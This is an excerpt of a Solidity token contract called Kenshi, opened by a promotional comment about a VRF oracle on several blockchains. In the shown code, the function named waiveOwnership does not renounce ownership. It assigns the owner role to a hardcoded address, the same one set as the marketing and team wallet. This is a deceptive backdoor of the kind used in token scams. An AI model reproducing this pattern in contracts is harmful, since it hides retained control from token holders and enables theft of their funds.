...
/*
The Kenshi Verifiable Random Function (VRF) 
oracle can generate and verify pseudorandom 
numbers to be used by smart contracts on-chain.
Enjoy a responsive VRF solution on BNB Smart Chain, 
Polygon, Fantom and Avalanche chains.
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0xF6DB997043131c638ce57c2F6Ef60a4663a1F637);
    }
...
contract Kenshi is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xF6DB997043131c638ce57c2F6Ef60a4663a1F637);
    address payable public teamWalletAddress = payable(0xF6DB997043131c638ce57c2F6Ef60a4663a1F637);
